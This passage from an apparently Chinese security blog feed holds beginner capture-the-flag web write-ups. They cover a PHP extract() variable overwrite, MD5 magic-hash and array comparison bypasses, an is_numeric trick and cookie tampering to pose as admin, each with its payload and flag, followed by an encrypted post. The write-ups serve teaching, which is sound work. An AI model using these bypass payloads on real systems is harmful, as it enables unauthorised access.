class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;secret.php&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;The Ducks&lt;/title&gt;</span><br><span class="line">        &lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7&quot; crossorigin=&quot;anonymous&quot;&gt;</span><br><span class="line">        &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js&quot; integrity=&quot;sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;jumbotron&quot;&gt;</span><br><span class="line">                &lt;center&gt;</span><br><span class="line">                    &lt;h1&gt;The Ducks&lt;/h1&gt;</span><br><span class="line">                    &lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; ?&gt;</span><br><span class="line">                        &lt;?php</span><br><span class="line">                        extract($_POST);</span><br><span class="line">                        if ($pass == $thepassword_123) &#123; ?&gt;</span><br><span class="line">                            &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                                &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                        &lt;?php &#125; ?&gt;</span><br><span class="line">                    &lt;?php &#125; ?&gt;</span><br><span class="line">                    &lt;form action=&quot;.&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">                            &lt;div class=&quot;col-md-6 col-md-offset-3&quot;&gt;</span><br><span class="line">                                &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">                                    &lt;div class=&quot;col-md-9&quot;&gt;</span><br><span class="line">                                        &lt;input type=&quot;password&quot; class=&quot;form-control&quot; name=&quot;pass&quot; placeholder=&quot;Password&quot; /&gt;</span><br><span class="line">                                    &lt;/div&gt;</span><br><span class="line">                                    &lt;div class=&quot;col-md-3&quot;&gt;</span><br><span class="line">                                        &lt;input type=&quot;submit&quot; class=&quot;btn btn-primary&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">                                    &lt;/div&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/center&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;p&gt;</span><br><span class="line">                &lt;center&gt;</span><br><span class="line">                    source at &lt;a href=&quot;source.phps&quot; target=&quot;_blank&quot;&gt;/source.php&lt;/a&gt;</span><br><span class="line">                &lt;/center&gt;</span><br><span class="line">            &lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br>定位到关键函数：extract()<br>这个函数通过百度我们可以知道：extract()函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目。</p><p>于是看到关键代码<code>if ($pass == $thepassword_123)</code>这里可以用变量覆盖，重新post两个相同名字不同值的变量上去就可以覆盖<br>payload：<code>http://ctf3.shiyanbar.com/web/variable/</code><br>需要post的数据：<code>pass=123&amp;thepassword_123=123</code><br><code>flag{f1c6edcdc3f1c291eea3f266600439aa}</code></p><h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><h3 id="2-md5-–提示：md5算法的漏洞？"><a href="#2-md5-–提示：md5算法的漏洞？" class="headerlink" title="2.md5 –提示：md5算法的漏洞？"></a>2.md5 –提示：md5算法的漏洞？</h3><p><a href="http://ctf3.shiyanbar.com/web/md5/" target="_blank" rel="noopener">http://ctf3.shiyanbar.com/web/md5/</a><br>打开看到源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">please input a</span><br><span class="line">source code:</span><br><span class="line">&lt;?php</span><br><span class="line">$md51 = md5(&quot;QNKCDZO&quot;);</span><br><span class="line">$a = @$_GET[&quot;a&quot;];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a != &quot;QNKCDZO&quot; &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    echo &quot;flag&#123;*****************&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>直接想到php黑魔法：和<code>QNKCDZO</code>MD5相等的数是<code>240610708</code><br>payload：<a href="http://ctf3.shiyanbar.com/web/md5/?a=240610708" target="_blank" rel="noopener">http://ctf3.shiyanbar.com/web/md5/?a=240610708</a><br><code>flag{56f008ff31c89382e15915a8ad78f209}</code></p><h2 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h2><h3 id="3-无论你输入什么都是错的"><a href="#3-无论你输入什么都是错的" class="headerlink" title="3.无论你输入什么都是错的"></a>3.无论你输入什么都是错的</h3><p><a href="http://ctf3.shiyanbar.com/web/wrong/" target="_blank" rel="noopener">http://ctf3.shiyanbar.com/web/wrong/</a><br>打开输入任何东西都错误于是查看源代码，发现右键被禁用<br>用最古老的姿势：<code>view-source:http://ctf3.shiyanbar.com/web/wrong/</code><br>看到有个not.js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function stop()&#123;</span><br><span class="line">alert(&apos;其实破解我很简单，加油哦！&apos;);</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">document.oncontextmenu=stop;</span><br><span class="line"></span><br><span class="line">function SymError()</span><br><span class="line">&#123;</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line">window.onerror = SymError;</span><br></pre></td></tr></table></figure><br>看出来这是禁用右键，于是我们修改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function stop()&#123;</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">document.oncontextmenu=stop;</span><br><span class="line"></span><br><span class="line">function SymError()</span><br><span class="line">&#123;</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line">window.onerror = SymError;</span><br></pre></td></tr></table></figure><br>发现可以右键审查元素，发现一个da.html直接访问，F12审查元素得到flag<br><code>flag{a37b3a66-172f-434d-9105-aada3aed5bdc}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;题目一&quot;&gt;&lt;a href=&quot;#题目一&quot; class=&quot;headerlink&quot; title=&quot;题目一&quot;&gt;&lt;/a&gt;题目一&lt;/h
      
    
    </summary>
    
    
      <category term="各类WP" scheme="http://bobosec.top/tags/%E5%90%84%E7%B1%BBWP/"/>
    
  </entry>
  
  <entry>
    <title>Book</title>
    <link href="http://bobosec.top/2018/10/23/Book/"/>
    <id>http://bobosec.top/2018/10/23/Book/</id>
    <published>2018-10-23T10:22:05.000Z</published>
    <updated>2018-10-24T01:30:34.401Z</updated>
    
    <content type="html"><![CDATA[<p>老师说每一届要走了没有给学弟学妹留下东西<br>这些积累的东西便于大家入门</p><h1 id="Web（初级入门）"><a href="#Web（初级入门）" class="headerlink" title="Web（初级入门）"></a>Web（初级入门）</h1><h2 id="题目链接1：http-120-24-86-145-8002-web2"><a href="#题目链接1：http-120-24-86-145-8002-web2" class="headerlink" title="题目链接1：http://120.24.86.145:8002/web2/"></a>题目链接1：<a href="http://120.24.86.145:8002/web2/" target="_blank" rel="noopener">http://120.24.86.145:8002/web2/</a></h2><p>打开发现一脸滑稽，于是最简单的就是F12审查元素<br><img src="/2018/10/23/Book/book1.jpg" alt=" "><br>于是可以看到flag<br><code>flag KEY{Web-2-bugKssNNikls9100}</code></p><h2 id="题目链接2：http-120-24-86-145-8002-yanzhengma"><a href="#题目链接2：http-120-24-86-145-8002-yanzhengma" class="headerlink" title="题目链接2：http://120.24.86.145:8002/yanzhengma/"></a>题目链接2：<a href="http://120.24.86.145:8002/yanzhengma/" target="_blank" rel="noopener">http://120.24.86.145:8002/yanzhengma/</a></h2><p>打开题目发现要输入验证码，可是最多让输入一个字符<br>于是F12审查元素，看到有最长字符限制<code>maxlength=&quot;1&quot;</code><br><img src="/2018/10/23/Book/book2.jpg" alt=" "><br>我们想到这是前端验证，于是修改最长输入字符限制，改为<code>maxlength=&quot;10&quot;</code><br>(这里只要是大于能输入验证的字符长度就行)，得到flag<br><code>flag{CTF-bugku-0032}</code></p><h2 id="题目链接3：http-120-24-86-145-8002-web3"><a href="#题目链接3：http-120-24-86-145-8002-web3" class="headerlink" title="题目链接3：http://120.24.86.145:8002/web3/"></a>题目链接3：<a href="http://120.24.86.145:8002/web3/" target="_blank" rel="noopener">http://120.24.86.145:8002/web3/</a></h2><p>打开题目发现一直弹窗<br><img src="/2018/10/23/Book/book3.jpg" alt=" "><br>老规矩查看源代码<br><img src="/2018/10/23/Book/book4.jpg" alt=" "><br>到最下面发现一行<code>&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125</code><br>这个是unicod代码，百度找到<a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">在线解码工具</a><br>解出即可<br><code>KEY{J2sa42ahJK-HS11III}</code></p><h2 id="题目链接4：http-web-bxsteam-xyz-actor"><a href="#题目链接4：http-web-bxsteam-xyz-actor" class="headerlink" title="题目链接4：http://web.bxsteam.xyz/actor/"></a>题目链接4：<a href="http://web.bxsteam.xyz/actor/" target="_blank" rel="noopener">http://web.bxsteam.xyz/actor/</a></h2><p>查看源代码就可以得到flag，如图<br><img src="/2018/10/23/Book/book5.jpg" alt=" "><br><code>flag{youfindme23333333333}</code></p><h2 id="题目链接5：http-bxs-cumt-edu-cn-challenge-web-cookiiii"><a href="#题目链接5：http-bxs-cumt-edu-cn-challenge-web-cookiiii" class="headerlink" title="题目链接5：http://bxs.cumt.edu.cn/challenge/web/cookiiii/"></a>题目链接5：<a href="http://bxs.cumt.edu.cn/challenge/web/cookiiii/" target="_blank" rel="noopener">http://bxs.cumt.edu.cn/challenge/web/cookiiii/</a></h2><p>既然说了纯属娱乐送分，就不要想太难了~<br>进去以后会提示：请以管理员身份登陆<br>于是我们打开Burp进行抓包<br>了解burp怎么使用请<a href="https://blog.csdn.net/gitchat/article/details/79168613" target="_blank" rel="noopener">点击这里</a><br>这是们抓的包<br><img src="/2018/10/23/Book/cooike2.jpg" alt=" "><br>可以看到<code>Cookie: user=guest;</code><br>题目说的必须管理员身份打开，所以修改为<code>Cookie: user=admin;</code>重新发包即可。<br>会得到这个东西<br><img src="/2018/10/23/Book/cooike3.jpg" alt=" "><br>图片下载下来<br><img src="/2018/10/23/Book/cooike4.jpg" alt=" "><br>丢进百度识图知道这个人叫维吉尼亚，但是维吉尼亚密码不是他发明的，只是命名而已。<br>然后找到在线解维吉尼亚的网站，推荐<code>www.ctftools.com</code><br>输入图片下面的字符串，可以看到图片上面有提示：<code>key：e</code><br>所以密钥我们输入：e<br>如下图<br><img src="/2018/10/23/Book/cooike5.jpg" alt=" "><br>点击解密即可得到flag<br>flag<code>thisisanoldencrypt</code></p><h2 id="题目链接6：http-120-24-86-145-8002-get-index1-php"><a href="#题目链接6：http-120-24-86-145-8002-get-index1-php" class="headerlink" title="题目链接6：http://120.24.86.145:8002/get/index1.php"></a>题目链接6：<a href="http://120.24.86.145:8002/get/index1.php" target="_blank" rel="noopener">http://120.24.86.145:8002/get/index1.php</a></h2><p>打开发现这些代码，并不是很难，大概意思就是num这个变量必须要等于1，但是加了<br><code>is_numeric()</code>函数<br><code>is_numeric()函数用于检测变量是否为数字或数字字符串</code><br>如果传入参数不是数字，就输出这个传入的参数，如果num函数等于1，就输出flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$num=$_GET[&apos;num&apos;];</span><br><span class="line">if(!is_numeric($num))</span><br><span class="line">&#123;</span><br><span class="line">echo $num;</span><br><span class="line">if($num==1)</span><br><span class="line">echo &apos;flag&#123;**********&#125;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以想到1<em>1=1<br>所以给$num传入1</em>1<br>payload：<code>http://120.24.86.145:8002/get/index1.php?num=1*1</code><br>即可得到<code>flag{bugku-789-ps-ssdf}</code></p><h2 id="题目链接7：http-39-107-92-230-web-web1-index-php"><a href="#题目链接7：http-39-107-92-230-web-web1-index-php" class="headerlink" title="题目链接7：http://39.107.92.230/web/web1/index.php"></a>题目链接7：<a href="http://39.107.92.230/web/web1/index.php" target="_blank" rel="noopener">http://39.107.92.230/web/web1/index.php</a></h2><p>打开，查看源代码，即可<br><img src="/2018/10/23/Book/book7.jpg" alt=" "><br><code>flag:{This_is_s0_simpl3}</code></p><h2 id="题目链接8：http-chinalover-sinaapp-com-web8"><a href="#题目链接8：http-chinalover-sinaapp-com-web8" class="headerlink" title="题目链接8：http://chinalover.sinaapp.com/web8/"></a>题目链接8：<a href="http://chinalover.sinaapp.com/web8/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web8/</a></h2><p>打开看到到这里找key，点击后跳转到另一个页面，查看源代码没有用，所以抓包看一下<br>右键点击send to repeater<br><img src="/2018/10/23/Book/book9.jpg" alt=" "><br>点击go发包看一下，直接看到了flag<br><img src="/2018/10/23/Book/book8.jpg" alt=" "><br><code>nctf{yougotit_script_now}</code></p><h2 id="题目链接9：http-chinalover-sinaapp-com-web17-index-php"><a href="#题目链接9：http-chinalover-sinaapp-com-web17-index-php" class="headerlink" title="题目链接9：http://chinalover.sinaapp.com/web17/index.php"></a>题目链接9：<a href="http://chinalover.sinaapp.com/web17/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php</a></h2><p>打开发现php代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&apos;a&apos;]) and isset($_GET[&apos;b&apos;]))&#123;</span><br><span class="line">if ($_GET[&apos;a&apos;] != $_GET[&apos;b&apos;])</span><br><span class="line">if (md5($_GET[&apos;a&apos;]) == md5($_GET[&apos;b&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;Wrong.&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个代码大概意思就是传a，b两个参数，a不等于b，但是MD5加密后a的MD5值=b的MD5值就会输出flag<br>这是php弱类型，我们可以传两个数组，这样也会输出flag<br>payload:<code>http://chinalover.sinaapp.com/web17/index.php?a[]=aa&amp;b[]=aaa</code><br>另一种姿势就是PHP黑魔法240610708和QNKCDZO这两个字符MD5值是相当的<br>payload：<code>http://chinalover.sinaapp.com/web17/index.php?a=240610708&amp;b=QNKCDZO</code><br><code>Flag: nctf{php_is_so_cool}</code></p><h2 id="题目链接10：http-lab1-xseclab-com-base7-eb68bd2f0d762faf70c89799b3c1cc52-index-php"><a href="#题目链接10：http-lab1-xseclab-com-base7-eb68bd2f0d762faf70c89799b3c1cc52-index-php" class="headerlink" title="题目链接10：http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php"></a>题目链接10：<a href="http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php</a></h2><p>打开查看源代码无果，然后看一下请求头<br>火狐浏览器打开，右键查看元素，如图，选择：网络<br><img src="/2018/10/23/Book/book10.jpg" alt=" "><br>打开以后查看header<br><img src="/2018/10/23/Book/book11.jpg" alt=" "><br>找到flag<br><code>key：kjh%#$#%FDjjj</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;老师说每一届要走了没有给学弟学妹留下东西&lt;br&gt;这些积累的东西便于大家入门&lt;/p&gt;
&lt;h1 id=&quot;Web（初级入门）&quot;&gt;&lt;a href=&quot;#Web（初级入门）&quot; class=&quot;headerlink&quot; title=&quot;Web（初级入门）&quot;&gt;&lt;/a&gt;Web（初级入门）&lt;/h1&gt;
      
    
    </summary>
    
    
      <category term="日益成长的小白" scheme="http://bobosec.top/tags/%E6%97%A5%E7%9B%8A%E6%88%90%E9%95%BF%E7%9A%84%E5%B0%8F%E7%99%BD/"/>
    
  </entry>
  
  <entry>
    <title>python学习</title>
    <link href="http://bobosec.top/2018/10/17/python%E5%AD%A6%E4%B9%A0/"/>
    <id>http://bobosec.top/2018/10/17/python学习/</id>
    <published>2018-10-17T03:32:34.000Z</published>
    <updated>2019-01-19T05:43:28.423Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read.">    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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